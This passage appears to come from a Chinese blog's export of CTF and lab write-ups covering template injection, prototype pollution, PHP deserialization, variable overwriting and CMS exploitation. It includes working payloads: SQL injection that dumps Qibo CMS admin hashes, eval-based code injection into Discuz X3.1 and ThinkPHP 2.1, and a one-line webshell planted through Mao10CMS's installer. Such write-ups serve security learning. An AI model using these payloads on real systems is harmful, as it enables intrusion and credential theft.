&#123;</span><br><span class=\"line\">                $out_html .= $matches[ <span class=\"number\">2</span> ][ $i ];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $pattern2 = <span class=\"string\">'/\\&#123;if([0-9]):/'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class=\"line\">                $out_html = str_replace( <span class=\"string\">'&#123;if'</span> . $matches3[ <span class=\"number\">1</span> ], <span class=\"string\">'&#123;if'</span>, $out_html );</span><br><span class=\"line\">                $out_html = str_replace( <span class=\"string\">'&#123;else'</span> . $matches3[ <span class=\"number\">1</span> ] . <span class=\"string\">'&#125;'</span>, <span class=\"string\">'&#123;else&#125;'</span>, $out_html );</span><br><span class=\"line\">                $out_html = str_replace( <span class=\"string\">'&#123;end if'</span> . $matches3[ <span class=\"number\">1</span> ] . <span class=\"string\">'&#125;'</span>, <span class=\"string\">'&#123;end if&#125;'</span>, $out_html );</span><br><span class=\"line\">                $out_html = <span class=\"keyword\">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $content = str_replace( $matches[ <span class=\"number\">0</span> ][ $i ], $out_html, $content );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">splits</span><span class=\"params\">( $s, $str=<span class=\"string\">','</span> )</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">empty</span>( $s ) ) <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>( <span class=\"string\">''</span> );</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( strpos( $s, $str ) !== <span class=\"keyword\">false</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> explode( $str, $s );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>( $s );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>zzzcms的模改，<a href=\"https://my.oschina.net/u/3076320/blog/4345639\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<p>parserIfLabel函数应该就是它的魔改，但用原来的payload肯定不行，文件包含函数和命令执行函数过滤了很多，所以我们在{if:assert($_request[phpinfo()])}phpinfo();{end if}的基础上改一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125; 失败</span><br><span class=\"line\">&#123;if:assert(phpinfo())&#125;phpinfo();&#123;end if&#125; 失败</span><br><span class=\"line\">&#123;if:phpinfo(123)&#125;phpinfo();&#123;end if&#125;失败</span><br><span class=\"line\">&#123;if:(phpinfo(123))&#125;&#123;end if&#125;失败</span><br><span class=\"line\">&#123;if:(phpinfo)(123)&#125;&#123;end if&#125; 失败</span><br><span class=\"line\">&#123;if:(system)(&#39;ls&#39;)&#125;&#123;end if&#125; 失败</span><br></pre></td></tr></table></figure>\n\n<p>但题中源码是遍历数组元素过滤，我们拼接一下函数不就可以绕过了吗，所以</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;if:(&#39;sys&#39;.&#39;tem&#39;)(&#39;ls&#39;)&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112630.png\" alt=\"\"></p>\n<p>那么直接读取根目录文件，读取根目录flag即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112709.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112722.png\" alt=\"\"></p>\n<h3 id=\"littlegame\"><a href=\"#littlegame\" class=\"headerlink\" title=\"littlegame\"></a>littlegame</h3><p>直接看路由里的index.js，可以看到得到flag的条件如果是</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113109.png\" alt=\"\"></p>\n<p>就会直接往服务端发送flag，来看下admin</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113137.png\" alt=\"\"></p>\n<p>获得的是环境变量中传入的值，接着往下看有几个方法</p>\n<p>SpawnPoint方法向服务端发送开始指令</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113159.png\" alt=\"\"></p>\n<p>Privilage方法接受NewAttributeKey和NewAttributeValue，假如为空则重定向，不为空则传入key和value并将他们传到session中</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163829.png\" alt=\"\"></p>\n<p>再看wp的时候学到了一招，在给了package.json的情况下可以直接运行npm audit命令查看存在的漏洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163527.png\" alt=\"\"></p>\n<p>这里就直接说明了是set-value造成的原型链污染，<a href=\"https://snyk.io/vuln/SNYK-JS-SETVALUE-450213\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<p>实践一下，首先开始</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113222.png\" alt=\"\"></p>\n<p>创建key和value</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113244.png\" alt=\"\"></p>\n<p>检查</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113256.png\" alt=\"\"></p>\n<h3 id=\"easytrick\"><a href=\"#easytrick\" class=\"headerlink\" title=\"easytrick\"></a>easytrick</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">trick</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick2;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;trick1 = (string)<span class=\"keyword\">$this</span>-&gt;trick1;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strlen(<span class=\"keyword\">$this</span>-&gt;trick1) &gt; <span class=\"number\">5</span> || strlen(<span class=\"keyword\">$this</span>-&gt;trick2) &gt; <span class=\"number\">5</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"你太长了\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;trick1 !== <span class=\"keyword\">$this</span>-&gt;trick2 &amp;&amp; md5(<span class=\"keyword\">$this</span>-&gt;trick1) === md5(<span class=\"keyword\">$this</span>-&gt;trick2) &amp;&amp; <span class=\"keyword\">$this</span>-&gt;trick1 != <span class=\"keyword\">$this</span>-&gt;trick2)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"string\">\"/flag\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">unserialize($_GET[<span class=\"string\">'trick'</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>要求传序列化字符串，传进去之后强制类型转换，数组绕过强碰撞没了，传入的元素长度必须在5以下，那么一些已知的相同MD5的字符串也没了，如果类型不等，值不等，他们的md5相等，就给flag</p>\n<p>php的一个小trick</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113342.png\" alt=\"\"></p>\n<p>即如果小数点后面超过14位php就会四舍五入</p>\n<p>这样的话我们构造trick1=2，trick2=2.00000000000000112，序列化之后md5的值就都是2了满足了两个md5强相等</p>\n<p>而其他两个条件也满足</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113358.png\" alt=\"\"></p>\n<p>全部满足，所以构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;i:2;s:6:&quot;trick2&quot;;d: 2.00000000000000112;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113435.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113451.png\" alt=\"\"></p>\n<p>看wp还有一种payload，利用的是NAN和INF的性质，他们分别代表非数字和无穷大，与任何数据类型（除了true）做强类型或弱类型比较均为false，<a href=\"https://blog.csdn.net/weixin_43257005/article/details/106118623\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">trick</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$tr = <span class=\"keyword\">new</span> trick();</span><br><span class=\"line\">$tr-&gt;trick1 = NAN;</span><br><span class=\"line\">$tr-&gt;trick2 = NAN;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($tr);</span><br><span class=\"line\"><span class=\"comment\">//O:5:\"trick\":2:&#123;s:6:\"trick1\";d:NAN;s:6:\"trick2\";d:NAN;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">trick</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $trick2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$tr = <span class=\"keyword\">new</span> trick();</span><br><span class=\"line\">$tr-&gt;trick1 = INF;</span><br><span class=\"line\">$tr-&gt;trick2 = INF;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($tr);</span><br></pre></td></tr></table></figure>","categories":["CTF"],"tags":["RCE","serialize","js原型链污染"]},{"title":"BJDCTF2020——Mark_loves_cat","url":"/2020/06/01/buu9%E2%80%94%E2%80%94%5BBJDCTF2020%5DMark%20loves%20cat/","content":"<p>平台：buuoj.cn<br>打开靶机<br><img src=\"https://img-blog.csdnimg.cn/20200601095355117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>先扫目录，发现git泄露<br><img src=\"https://img-blog.csdnimg.cn/20200601095518922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>githack下下来<br><img src=\"https://img-blog.csdnimg.cn/20200601095632305.png\" alt=\"在这里插入图片描述\"><br>看下这两个php文件<br><img src=\"https://img-blog.csdnimg.cn/20200601095658442.png\" alt=\"在这里插入图片描述\"><br>flag.php读取flag，index.php前端代码后php关键代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$yds = <span class=\"string\">\"dog\"</span>;</span><br><span class=\"line\">$is = <span class=\"string\">\"cat\"</span>;</span><br><span class=\"line\">$handsome = <span class=\"string\">'yds'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $y;<span class=\"comment\">//把post传入的变量x前添加$</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">as</span> $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $$y;<span class=\"comment\">//把get传入的x,y前添加$</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">as</span> $x =&gt; $y)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($_GET[<span class=\"string\">'flag'</span>] === $x &amp;&amp; $x !== <span class=\"string\">'flag'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>($handsome);<span class=\"comment\">//判断get传进来的值是否等于flag</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'flag'</span>]) &amp;&amp; !<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'flag'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>($yds);<span class=\"comment\">//get和post有一方传flag，输出$yds</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'flag'</span>] === <span class=\"string\">'flag'</span>  || $_GET[<span class=\"string\">'flag'</span>] === <span class=\"string\">'flag'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>($is);<span class=\"comment\">//get和post不能传flag=flag</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"the flag is: \"</span>.$flag;%</span><br></pre></td></tr></table></figure>\n<p>考点是变量覆盖漏洞<br>先了解下概念：</p>\n<blockquote>\n<p>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。<br>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p>\n</blockquote>\n<p><a href=\"https://www.jianshu.com/p/a4d782e91852\" target=\"_blank\" rel=\"noopener\">引用</a>个例子：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($_GET <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">$&#123;$key&#125; = $value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>传入的数据$key和$value，${$key}用了get传进来的$key做为新的变量,之后再将get传进来的$value赋值给它。假如?a=1 经过覆盖就会解析为$a=1。就造成了变量覆盖。</p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>感觉有点绕，但通过flag.php，我们知道是要get传入一个$flag，post一个flag，这样，就能$flag = file_get_contents(‘/flag’);<br>那么先看get吧，首先我们传入一个yds=flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$$x = $$y之后就变成了$yds=$flag，$flag就是我们要得到flag的值</span><br></pre></td></tr></table></figure>\n\n<p>再post一个$flag=flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">post经过$$x = $y变成了$$flag = flag</span><br></pre></td></tr></table></figure>\n\n<p>由于<br><img src=\"https://img-blog.csdnimg.cn/20200601104720738.png\" alt=\"在这里插入图片描述\"><br>只要get和post没有$flag参数，就输出$yds，我们传入的值为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">get：yds</span><br><span class=\"line\">post: $flag</span><br></pre></td></tr></table></figure>\n<p>实际被覆盖之后是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">get：$yds</span><br><span class=\"line\">post：$$flag</span><br></pre></td></tr></table></figure>\n<p>满足没有$flag的条件<br>因此可以exit($yds)<br>而$yds=$flag，$$flag=flag<br>最终就可以执行$flag = file_get_contents(‘/flag’);<br>把值传上去得到flag<br><img src=\"https://img-blog.csdnimg.cn/20200601105450804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计","变量覆盖"]},{"title":"i春秋刷题——cms实验","url":"/2020/08/17/ichunqiu_cms/","content":"<p>平台：ichunqiu.com</p>\n<h3 id=\"渗透测试笔记\"><a href=\"#渗透测试笔记\" class=\"headerlink\" title=\"渗透测试笔记\"></a>渗透测试笔记</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080504.png\" alt=\"\"></p>\n<p>目标网站是一个齐博cms，先扫一波目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080743.png\" alt=\"\"></p>\n<p>没找到有啥默认用户名和密码，但输入admin提示的是密码错误，但输其他的会显示用户错误，尝试对admin爆破即可。失败</p>\n<p>注册个普通账号，啥都点一下，想起来以前好像做过齐博cms更新资料有个报错注入，百度了一下，可能版本不一样这里没userinfo，pass。</p>\n<p>但还是找到一个整站注入：<a href=\"https://www.seebug.org/vuldb/ssvid-94157\" target=\"_blank\" rel=\"noopener\">https://www.seebug.org/vuldb/ssvid-94157</a></p>\n<p>直接爆了管理员账号密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815090816.png\" alt=\"\"></p>\n<p>但这里密码hash没显示完全，改一下payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">index.php?jobs&#x3D;show&amp;label_hf[1&#39; and extractvalue(1,concat(0x5c,(select concat(username,password) from qb_members limit 1)))%23][2]&#x3D;asd</span><br><span class=\"line\">index.php?jobs&#x3D;show&amp;label_hf[1&#39; and extractvalue(1,concat(0x5c,(select substr(password,20,30) from qb_members limit 1)))%23][2]&#x3D;asd</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815093735.png\" alt=\"\"></p>\n<p>跟之前的拼接一下得到密码hash：b10a9a82cf828627be682033e6c5878c，解密网站解得：whoami!@#123</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094014.png\" alt=\"\"></p>\n<p>登陆后台</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094128.png\" alt=\"\"></p>\n<p>百度到了一个后台Getshell，<a href=\"https://xz.aliyun.com/t/2248，试一下\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2248，试一下</a></p>\n<p>增加栏目为<code>${assert($_POST[a])}</code>，再菜刀连接/data/guide_fid.php，出错，失败</p>\n<p>再试下这个：<a href=\"https://www.uedbox.com/post/41188/\" target=\"_blank\" rel=\"noopener\">https://www.uedbox.com/post/41188/</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101357.png\" alt=\"\"></p>\n<p>点击生成静态</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101506.png\" alt=\"\"></p>\n<p>成功getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101547.png\" alt=\"\"></p>\n<p>找到flag文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101736.png\" alt=\"\"></p>\n<p>第三题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101813.png\" alt=\"\"></p>\n<p>打开网站是个discuz论坛</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815103608.png\" alt=\"\"></p>\n<p>没看清题目还以为这是两个服务器的站。。。那么直接在刚刚获得的shell里操作</p>\n<p>找下论坛的数据库文件，没找到，瞄一下wp，在dedecms.bak的data文件夹里（问号）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104142.png\" alt=\"\"></p>\n<p>在菜刀的数据库管理填下信息登上去</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104906.png\" alt=\"\"></p>\n<p>然后就是翻salt值，查看所有包含salt字段值的列</p>\n<p><code>select * from information_schema.columns where column_name = &#39;salt&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110204.png\" alt=\"\"></p>\n<p>到相应位置读取值，这里有两个，看下用户名分别对应哪个即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110253.png\" alt=\"\"></p>\n<h3 id=\"这不是DZ漏洞？\"><a href=\"#这不是DZ漏洞？\" class=\"headerlink\" title=\"这不是DZ漏洞？\"></a>这不是DZ漏洞？</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083258.png\" alt=\"\"></p>\n<p>打开网站是dz论坛，在网站底部看到是dz3.1</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083412.png\" alt=\"\"></p>\n<p>百度下相关漏洞，找到了x3.1的插件/utility/convert/index.php存在代码执行漏洞</p>\n<p>试下，页面没被删除</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816085638.png\" alt=\"\"></p>\n<p>payload：<code>a=config&amp;source=d7.2_x2.0&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&amp;submit=yes</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091511.png\" alt=\"\"></p>\n<p>用菜刀连接<code>/utility/convert/data/config.inc.php</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091538.png\" alt=\"\"></p>\n<p>拿到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091659.png\" alt=\"\"></p>\n<h3 id=\"reinstall\"><a href=\"#reinstall\" class=\"headerlink\" title=\"reinstall\"></a>reinstall</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816130535.png\" alt=\"\"></p>\n<p>扫一遍没发现啥，看题目是reinstall想到可能是有Install文件没删，install请求无果但是install.php.bak成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132708.png\" alt=\"\"></p>\n<p>啥都不知道肯定安装不成功，但出错的时候把配置文件路径爆出来了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132830.png\" alt=\"\"></p>\n<p>访问几个目录啥都没有，百度到了一个<a href=\"http://www.hackdig.com/02/hack-18952.htm\" target=\"_blank\" rel=\"noopener\">Mao10CMS前台Getshell</a>，提到了Application/Common/Conf/db.php 也就是这个环境中爆出来的配置文件安装没有做任何过滤，直接就是安装了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if($_POST[&#39;db_host&#39;] &amp;&amp; $_POST[&#39;db_name&#39;] &amp;&amp; $_POST[&#39;db_user&#39;] &amp;&amp; $_POST[&#39;db_prefix&#39;])</span><br><span class=\"line\">&#123; $file &#x3D; &quot;Application&#x2F;Common&#x2F;Conf&#x2F;db.php&quot;;</span><br><span class=\"line\">$data &#x3D; &quot; &#39;mysql&#39;, &#x2F;&#x2F; 数据库类型</span><br><span class=\"line\">&#39;DB_HOST&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_host&#39;].&quot;&#39;, &#x2F;&#x2F; 服务器地址</span><br><span class=\"line\">&#39;DB_NAME&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_name&#39;].&quot;&#39;, &#x2F;&#x2F; 数据库名</span><br><span class=\"line\">&#39;DB_USER&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_user&#39;].&quot;&#39;, &#x2F;&#x2F; 用户名</span><br><span class=\"line\">&#39;DB_PWD&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_pwd&#39;].&quot;&#39;, &#x2F;&#x2F; 密码</span><br><span class=\"line\">&#39;DB_PORT&#39; &#x3D;&gt; 3306, &#x2F;&#x2F; 端口</span><br><span class=\"line\">&#39;DB_PREFIX&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_prefix&#39;].&quot;&#39;, &#x2F;&#x2F; 数据库表前缀</span><br><span class=\"line\">&#39;DB_CHARSET&#39; &#x3D;&gt; &#39;utf8&#39;, &#x2F;&#x2F;数据库编码</span><br><span class=\"line\">&#39;ADMIN_LOGIN&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;admin_login&#39;].&quot;&#39;, &#x2F;&#x2F;创始人账号</span><br><span class=\"line\">&#39;ADMIN_PASS&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;admin_pass&#39;].&quot;&#39;, &#x2F;&#x2F;创始人密码</span><br><span class=\"line\">); ?&gt;&quot;;</span><br><span class=\"line\">$db_info &#x3D; file_put_contents ($file, $data);</span><br><span class=\"line\">if($db_info) &#123; $callback &#x3D; 1; &#125; else &#123; $callback &#x3D; 2; &#125;;</span><br><span class=\"line\">$con &#x3D; mysql_connect($_POST[&#39;db_host&#39;],$_POST[&#39;db_user&#39;],$_POST[&#39;db_pwd&#39;]);</span><br><span class=\"line\">mysql_query(&quot;CREATE DATABASE &quot;.$_POST[&#39;db_name&#39;],$con);</span><br><span class=\"line\">if (!$con) &#123; $callback &#x3D; 2; &#125;; &#125; else &#123; $callback &#x3D; 0; &#125; ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>db_host，db_user，db_name,db_pwd会写入数据库，但db_prefix会写入配置文件，写入一句话木马即可getshell</p>\n<p>实践一下，按照文章里的方式构造一句话木马</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134450.png\" alt=\"\"></p>\n<p><code>&#39;,</code>把前面闭合，<code>,//</code>把后面注释</p>\n<p>提交再用菜刀连接，成功getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134647.png\" alt=\"\"></p>\n<p>在html文件夹里找到flag</p>\n<h3 id=\"框架漏洞\"><a href=\"#框架漏洞\" class=\"headerlink\" title=\"框架漏洞\"></a>框架漏洞</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204108.png\" alt=\"\"></p>\n<p>登录失败的时候爆出了是一个叫shuguang的cms</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204203.png\" alt=\"\"></p>\n<p>百度了一下这个cms基于Thinkphp开发，尝试让框架报错爆出来是tp2.1</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204720.png\" alt=\"\"></p>\n<p>2.1可执行任意系统命令，直接搜payload了，</p>\n<p><code>index.php/Index/index/name/$%7B@phpinfo%28%29%7D</code>输出phpinfo()信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204919.png\" alt=\"\"></p>\n<p><code>http://www.test.ichunqiu/index.php/module/action/param1/${@print(eval($_POST[c]))}</code>菜刀直接连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817205810.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817205845.png\" alt=\"\"></p>\n<h3 id=\"越权访问\"><a href=\"#越权访问\" class=\"headerlink\" title=\"越权访问\"></a>越权访问</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817212259.png\" alt=\"\"></p>\n<p>搜下webftp，了解到相当于一个WEB文件共享程序，也就是网盘。</p>\n<p>抓个包爆破出了弱密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817213902.png\" alt=\"\">‘</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817214510.png\" alt=\"\"></p>\n<p>但无论是上传文件，创建文件还是创建目录都没有权限，然后扫目录发现还有个bak目录，是帝国备份王后台</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817223252.png\" alt=\"\"></p>\n<p>百度下相关信息，了解到存在万能cookie从而造成<a href=\"https://www.cnblogs.com/LittleHann/p/4519968.html\" target=\"_blank\" 